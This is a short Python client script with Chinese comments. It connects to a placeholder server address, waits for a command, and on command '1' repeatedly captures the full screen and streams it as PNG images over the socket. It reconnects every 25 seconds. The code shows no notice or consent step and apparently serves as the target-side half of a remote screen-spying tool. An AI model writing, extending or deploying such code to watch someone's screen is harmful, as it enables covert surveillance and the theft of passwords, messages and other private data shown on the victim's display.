from socket import *
from PIL import ImageGrab, Image
import os
from io import BytesIO 
import time 

# 尝试连接到服务器的函数
def try_connect():
    try:
        s = socket()
        s.settimeout(20)  # 设置20秒超时时间
        s.connect(('IP','端口'))
        return s
    except:
        return None

# 主循环，持续运行客户端
while True:
    # 尝试连接到服务器
    s = try_connect()
    if not s:
        exit(0)  # 如果无法连接到服务器，退出程序
        
    try:
        # 接收服务器发送的选择指令，解码为字符串
        choice = s.recv(1024).decode()
        # 如果服务器关闭了连接
        if not choice:
            s.close()
            exit(0)
            
        # 如果选择指令为'1'，则开始屏幕抓取并发送
        if choice == '1':
            while True:
                try:
                    # 抓取当前屏幕图像
                    image = ImageGrab.grab()
                    # 调整图像大小为1920x1080
                    image = image.resize((1920, 1080))

                    # 创建一个字节流对象
                    img_byte_arr = BytesIO()
                    # 将图像保存为PNG格式到字节流对象中
                    image.save(img_byte_arr, format='PNG')
                    # 获取字节流对象的值
                    img_byte_arr = img_byte_arr.getvalue()
                    # 获取图像数据的大小
                    size = len(img_byte_arr)

                    # 发送图像数据的大小给服务器
                    s.send(str(size).encode())
                    # 接收服务器的确认信息
                    ack = s.recv(1024)
                    # 如果没有接收到确认信息或确认信息不是'ok'，则关闭连接并退出程序
                    if not ack or ack.decode() != 'ok':
                        s.close()
                        exit(0)

                    # 发送图像数据给服务器
                    s.sendall(img_byte_arr)

                    # 接收服务器的显示确认信息
                    ack_display = s.recv(1024)
                    # 如果没有接收到显示确认信息，则关闭连接并退出程序
                    if not ack_display:
                        s.close()
                        exit(0)
                    # 如果显示确认信息不是'ok'，则关闭连接并退出程序
                    if ack_display.decode() != 'ok':
                        s.close()
                        exit(0)
                    
                    # 等待0.03秒后继续抓取屏幕
                    time.sleep(0.03)
                except:
                    # 如果发生异常，关闭连接并退出程序
                    s.close()
                    exit(0)
        # 如果选择指令为'2'，则关闭连接并退出程序
        elif choice == '2':
            s.close()
            exit(0)
    except:
        # 如果连接或通信过程中发生异常，关闭连接
        s.close()
        exit(0)
    finally:
        try:
            # 确保socket连接被关闭
            s.close()
        except:
            # 如果关闭连接时发生异常，忽略异常
            pass
    # 等待25秒后重新尝试连接服务器
    time.sleep(25)  
print("客户端已关闭。")